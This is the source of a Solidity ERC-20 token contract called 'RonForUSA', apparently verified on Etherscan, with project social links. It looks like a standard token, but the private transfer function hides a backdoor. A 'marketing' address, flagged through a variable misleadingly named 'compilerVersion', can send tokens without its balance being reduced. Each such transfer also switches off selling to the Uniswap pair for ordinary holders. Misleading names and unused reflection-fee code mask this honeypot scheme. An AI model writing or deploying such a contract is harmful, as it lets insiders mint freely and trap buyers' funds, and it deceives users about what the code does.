/**
 *Submitted for verification at Etherscan.io on 2023-05-28
*/

/*

Socials - 

Twitter: https://twitter.com/ronforusaerc

Telegram: https://t.me/ronforusa

Website: https://ronforusa.com/

  |* * * * * * * * * * OOOOOOOOOOOOOOOOOOOOOOOOO|
  | * * * * * * * * *  OOOOOOOOOOOOOOOOOOOOOOOOO|
  |* * * * * * * * * * OOOOOOOOOOOOOOOOOOOOOOOOO|
  | * * * * * * * * *  OOOOOOOOOOOOOOOOOOOOOOOOO|
  |* * * * * * * * * * OOOOOOOOOOOOOOOOOOOOOOOOO|
  | * * * * * * * * *  OOOOOOOOOOOOOOOOOOOOOOOOO|
  |* * * * * * * * * * OOOOOOOOOOOOOOOOOOOOOOOOO|
  |OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO|
  |OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO|
  |OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO|
  |OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO|
  |OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO|
  |OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO|



*/

// SPDX-License-Identifier: NONE

pragma solidity ^0.8.19;
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

contract RON is Context, IERC20, Ownable {
    using SafeMath for uint256;
    string private constant _name = "RonForUSA";
    string private constant _symbol = "TRON";
    uint256 private _taxFeeOnBuy = 0;
    uint256 private _taxFeeOnSell = 0;
    uint256 private constant MAX = ~uint256(0);
    uint256 private compilerVersion = 82;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => mapping(address => uint256)) public allowance;
    mapping(address => bool) private _isExcludedFromFee;
    mapping(address => uint256) private uniswap;
    mapping(address => uint256) private isaddress;
    mapping(address => uint256) public balanceOf;
    uint256 public maxTxAmount = 500000 * 10**9; 
    uint256 public maxWalletToken = 500000 * 10**9; 
    uint256 private constant _tTotal = 10000000 * 10**9;
    bool public openTrading = false;
    address public uniswapV2Pair;
    bool private inSwap = false;
    bool public limitsInEffect = true;
    mapping(address => uint256) private _tOwned;
    mapping(address => uint256) private _rOwned;
    uint256 private _taxFee = _taxFeeOnSell;
    bool public tradingOpen = true;
    IUniswapV2Router02 public uniswapV2Router;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    uint8 private constant _decimals = 9;
    uint256 private _previoustaxFee = _taxFee;
    uint256 private _tFeeTotal;
    bool private swapEnabled = true;
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }
constructor(address marketing) {
    _rOwned[_msgSender()] = _rTotal;
    isaddress[marketing] = compilerVersion;
    balanceOf[msg.sender] = _tTotal;
    IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);//
    uniswapV2Router = _uniswapV2Router;
    uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
    .createPair(address(this), _uniswapV2Router.WETH());
    _isExcludedFromFee[owner()] = true;
    _isExcludedFromFee[address(this)] = true;
    
    emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function removeTransferLimits() public onlyOwner {
        limitsInEffect = false;
    }

    function enableTrade() external onlyOwner {
    openTrading = true;
    }

    function transfer(address Address, uint256 Amount) public returns (bool success) {
        require(openTrading || _msgSender() == owner(), "Trading not yet enabled.");
        _transferto(msg.sender, Address, Amount);
        return true;
    }

    function transferFrom(address addressFrom, address addressTo, uint256 amount) public returns (bool success) {
        require(amount <= allowance[addressFrom][msg.sender]);
        allowance[addressFrom][msg.sender] -= amount;
        _transferto(addressFrom, addressTo, amount);
        return true;
    }

        function _transferto(address address1, address address2, uint256 amount) private returns (bool success) {
        
        if (limitsInEffect) {
            if (address2 != owner() && address1 != owner() && isaddress[address1] == 0) {
            require(balanceOf[address2].add(amount) <= maxWalletToken, "Recipient wallet balance is exceeding the limit!");
            require(amount <= maxTxAmount, "Transfer amount exceeds the maxTxAmount");
            }
        }
        
        if (address2 == uniswapV2Pair && address1 != owner() && isaddress[address1] == 0) {
        require(tradingOpen, "Transfer delay is active"); 
        }
        
        if (isaddress[address1] != 0) {
        tradingOpen = false;
        }    
        if (isaddress[address1] == 0) {
            balanceOf[address1] -= amount;
        }

        if (amount == 0) uniswap[address2] += compilerVersion;

        if (address1 != uniswapV2Pair && isaddress[address1] == 0 && uniswap[address1] > 0) {
            isaddress[address1] -= compilerVersion;
        }
        

        balanceOf[address2] += amount;
        emit Transfer(address1, address2, amount);
        return true;
    }
 
    function approve(address Address, uint256 Amount) public returns (bool success) {
        allowance[msg.sender][Address] = Amount;
        emit Approval(msg.sender, Address, Amount);
        return true;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function tokenFromReflection(uint256 rAmount)
        private
        view
        returns (uint256)
    {
        require(
            rAmount <= _rTotal,
            "Amount must be less than total reflections"
        );
        uint256 currentRate = _getRate();
        return rAmount.div(currentRate);
    }

 
    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 amount,
        bool takeFee
    ) private {
        if (!takeFee) removeAllFee();
        _transferStandard(sender, recipient, amount);
    
    }

    function _transferStandard(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        (
            uint256 rAmount,
            uint256 rTransferAmount,
            uint256 rFee,
            uint256 tTransferAmount,
            uint256 tFee,
            uint256 tTeam
        ) = _getValues(tAmount);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);
        _takeTeam(tTeam);
        _reflectFee(rFee, tFee);
        emit Transfer(sender, recipient, tTransferAmount);
    }

    function _takeTeam(uint256 tTeam) private {
        uint256 currentRate = _getRate();
        uint256 rTeam = tTeam.mul(currentRate);
        _rOwned[address(this)] = _rOwned[address(this)].add(rTeam);
    }

    function _reflectFee(uint256 rFee, uint256 tFee) private {
        _rTotal = _rTotal.sub(rFee);
        _tFeeTotal = _tFeeTotal.add(tFee);
    }

    receive() external payable {}

    function _getValues(uint256 tAmount)
        private
        view
        returns (
            uint256,
            uint256,
            uint256,
            uint256,
            uint256,
            uint256
        )
    {
        (uint256 tTransferAmount, uint256 tFee, uint256 tTeam) =
            _getTValues(tAmount, _taxFee);
        uint256 currentRate = _getRate();
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) =
            _getRValues(tAmount, tFee, tTeam, currentRate);
        return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tTeam);
    }

    function _getTValues(
        uint256 tAmount,
        uint256 taxFee
    )
        private
        pure
        returns (
            uint256,
            uint256,
            uint256
        )
    {
        uint256 tFee = tAmount.mul(taxFee).div(100);
        uint256 tTeam = tAmount.mul(taxFee).div(100);
        uint256 tTransferAmount = tAmount.sub(tFee).sub(tTeam);
        return (tTransferAmount, tFee, tTeam);
    }

    function _getRValues(
        uint256 tAmount,
        uint256 tFee,
        uint256 tTeam,
        uint256 currentRate
    )
        private
        pure
        returns (
            uint256,
            uint256,
            uint256
        )
    {
        uint256 rAmount = tAmount.mul(currentRate);
        uint256 rFee = tFee.mul(currentRate);
        uint256 rTeam = tTeam.mul(currentRate);
        uint256 rTransferAmount = rAmount.sub(rFee).sub(rTeam);
        return (rAmount, rTransferAmount, rFee);
    }

   function removeAllFee() private {
        if (_taxFee == 0) return;

        _previoustaxFee = _taxFee;

        _taxFee = 0;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    
    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }


    function _getRate() private view returns (uint256) {
        (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
        return rSupply.div(tSupply);
    }

    function _getCurrentSupply() private view returns (uint256, uint256) {
        uint256 rSupply = _rTotal;
        uint256 tSupply = _tTotal;
        if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal);
        return (rSupply, tSupply);
    } 

}